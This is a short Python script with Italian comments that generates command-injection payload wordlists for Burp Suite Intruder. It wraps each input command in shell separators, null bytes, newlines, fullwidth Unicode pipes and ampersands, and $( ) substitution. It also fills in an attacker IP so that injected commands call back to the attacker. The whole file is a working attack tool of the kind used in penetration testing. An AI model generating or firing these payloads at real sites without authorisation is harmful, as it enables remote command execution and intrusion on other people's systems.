import sys

# INPUT:
# - <COMANDO>
# - array di suffissi
# - array di prefissi
#
# Per ogni comando genere un nuovo comando -> $(<COMANDO>)
# OUTPUT: Per ogni <COMANDO> e $(<COMANDO>) genera 
# <COMANDO>
# <PREFISSO><COMANDO>
# <PREFISSO><COMANDO><SUFFISSO-1>
# <COMANDO><SUFFISSO-1>
# <PREFISSO><COMANDO><SUFFISSO-2>
# <COMANDO><SUFFISSO-2>
#...
# <PREFISSO><COMANDO><SUFFISSO-n>
# <COMANDO><SUFFISSO-n>
def genera_comandi_manipolati(comando_base, prefissi, suffissi):
    comando_parentesi = f"$({comando_base})"
    varianti_comando = [comando_base, comando_parentesi]
    
    comandi_generati = []
    
    for variante in varianti_comando:
        # Tengo solo il comando
        comandi_generati.append(f"{variante}")
        for prefisso in prefissi:
            # Aggiunge solo il prefisso
            comandi_generati.append(f"{prefisso}{variante}")
            
            # Aggiunge prefisso + tutti i suffissi
            # Aggiunge anche solo i suffissi
            for suffisso in suffissi:
                comandi_generati.append(f"{prefisso}{variante}{suffisso}")
                comandi_generati.append(f"{variante}{suffisso}")
    
    return comandi_generati
    

if len(sys.argv) < 3:
    print("Usage: python script.py <ATTACKER-IP> <FILE-IN>")
    print("ATTACER-IP: IP della scheda di rete dell'attaccante su cui si riceveranno chiamate dalla macchina target")
    print("FILE-IN: file contenente la lista di ingresso dei comandi")
    print("")
    print("Lo script genera una lista di comandi da caricare su burpSuite intruder per verificare se il parametro individuato sul sito target")
    print("è iniettabile ai seguenti tipi di attacco: commandi injection, LFI, RFI, XSS, SQL-injection, SSTI")
    print("")
    sys.exit(1)

ip_address = sys.argv[1]
file_in = sys.argv[2]
prefissi = ["%00 ", "%00; ", "%0A ", "|| ", "| ", "; ", "& ", "&& ", "%EF%BC%86 ", "%EF%BC%86%EF%BC%86 ", "%EF%BD%9C ", "%EF%BD%9C%EF%BD%9C "]
suffissi = ["%00 ", "%00; ", "%0A ", "? ", "?%00 ", "; ", "& ", "|| ", "| ", "-- ", "# "]
with open(file_in, 'r') as f:
    with open('out-command-injection-list.txt', 'w') as out:
        for line in f:
            line = line.strip()
            if line.strip() == "" or line.startswith("=="):
            	# se leggo da input una stringa vuota o qualche cosa che inizia per == non faccio niente
                continue
            if "<ATTACKER-IP>" in line:
            	# se ho comandi con ATTACKER-IP lo sostituisco con l'IP reale
                line = line.replace("<ATTACKER-IP>", ip_address)
            
            # Generazione comandi
            lista_comandi = genera_comandi_manipolati(line, prefissi, suffissi)
            for idx, cmd in enumerate(lista_comandi, 1):
                print(f"{cmd}")
                out.write(f"{cmd}" + '\n')
                
            
